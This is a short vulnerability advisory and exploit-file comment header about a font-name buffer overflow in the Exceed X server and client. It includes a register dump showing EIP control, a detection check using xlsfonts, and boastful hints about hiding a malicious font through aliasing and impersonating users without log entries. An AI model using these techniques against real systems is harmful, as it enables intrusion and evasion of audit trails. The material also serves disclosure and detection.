The Exceed server and client have been reported prone to a remotely triggered buffer overflow vulnerability. An attacker may trigger this vulnerability by sending excessive data as a font name to the server via a malicios XLoadQueryFont() request, or by passing a malicious font name from the server to the client in a manner sufficient to trigger the overflow. When the vulnerable software handles this request it will crash.

 * I'll tell you: Much more please sirs.
 *
 * **************************************
 *
 * Exceed has some bugs caused by the way it handles fonts, in a local and remote
 * context.
 *
 * Debug output created by master techniques:
 * EAX = C0000000
 * EBX = 00000000
 * ECX = 40000000
 * EDX = 00000501
 * ESI = 41414141   <-------- // Here
 * EDI = 0012E138
 * EIP = 41414141   <-------- // Here
 * ESP = 0012E0C8
 * EBP = 0012E0F0
 *
 * A way to check that a server is not trying to exploit your PC could be:
 *  $ xlsfonts -display exceed_server:0.0
 *  ...
 *  --------0------
 *  --arial-bold-r---0-0-120-120-p-0-iso8859-1
 *  --arial-medium-r---0-0-120-120-p-0-iso8859-1
 *  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.... <-- Here
 *  ...
 *
 * A way to hide evil font would be through the use of font aliasing.
 * 			-the first ever font spoofing technique, lol.
 *
 * [-] We can crash a local Exceed server * 2
 * [-] We can crash a remote Exceed server * many lol
 * [-] We can crash Exceed client that uses evil X Font Server * 1
 * [-] We can write over EIP address * many lol

 * rwxr-xr-x xterm exploit!

 * $ export DISPLAY=192.168.1.31:0.0    //Valid host

 *
 * Root user can now have super 0day xterm sploit that s/he can use to own local user
 * accounts!
 *
 * ** This would give root the ability to become any user on the system **
 *
 * More serious than su, it does not leave a log entry behind, real anon hacker style.
